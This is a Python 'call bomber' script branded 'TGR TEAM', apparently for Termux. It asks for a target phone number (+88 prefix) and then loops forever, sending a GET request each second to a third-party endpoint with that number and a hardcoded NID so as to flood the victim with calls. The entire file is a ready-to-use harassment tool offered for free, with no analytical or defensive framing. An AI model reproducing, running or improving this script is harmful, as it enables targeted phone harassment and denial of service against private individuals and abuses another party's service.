import sys
import time
import requests

def banner():
    print("""
 ████████╗ ██████╗ ██████╗     ████████╗███████╗ █████╗ ███╗   ███╗
 ╚══██╔══╝██╔════╝██╔══██╗    ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║
    ██║   ██║     ██║  ██║       ██║   █████╗  ███████║██╔████╔██║
    ██║   ██║     ██║  ██║       ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║
    ██║   ╚██████╗╚██████╔╝       ██║   ███████╗██║  ██║██║ ╚═╝ ██║
    ╚═╝    ╚═════╝ ╚═════╝        ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝
    
    Cyber Security 
    ————————————————————
    DEVELOPER     :       RAFI TRADAR
    TELEGRAM      :       @rafitreder
    TOOL          :       CALL BOMBAR
    STATUS        :       FREE
    ————————————————————
    """)

def main_menu():
    while True:
        banner()
        print("[ 1 ] CALL BOM")
        print("[ 2 ] TELEGRAM")
        print("[ 3 ] EXIT")
        
        choice = input("\nSelect an option (1-3): ").strip()
        
        if choice == '1':
            phone = input("TARGET NUMBER➤ +88").strip()
            full_number = "+88" + phone
            start_bombing(full_number)
        elif choice == '2':
            print("\nTelegram: @rafitreder\n")
            input("Press Enter to return to menu...")
        elif choice == '3':
            print("\nExiting...")
            sys.exit(0)
        else:
            print("\nInvalid choice. Please try again.\n")
            time.sleep(1)

def start_bombing(phone_number):
    nid = "5845888855"
    url = f"https://CobraExpire.freedev.app/roct_main.php?phone={phone_number}&nid={nid}"
    
    print(f"\nStarting requests for: {phone_number}")
    print("Press Ctrl + C anytime to stop and return to the menu.\n")
    
    try:
        while True:
            try:
                response = requests.get(url, timeout=5)
                if response.status_code == 200:
                    print("TGR TEAM [ CALL SUCCESS √ ]")
                else:
                    print(f"TGR TEAM [ STATUS: {response.status_code} ]")
            except requests.exceptions.RequestException:
                print("TGR TEAM [ CONNECTION ERROR / RETRYING ]")
            
            # Delay between requests to keep Termux stable
            time.sleep(1)
            
    except KeyboardInterrupt:
        print("\n\nStopped by user. Returning to menu...\n")
        time.sleep(1.5)

if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        print("\nExiting program.")
        sys.exit(0)
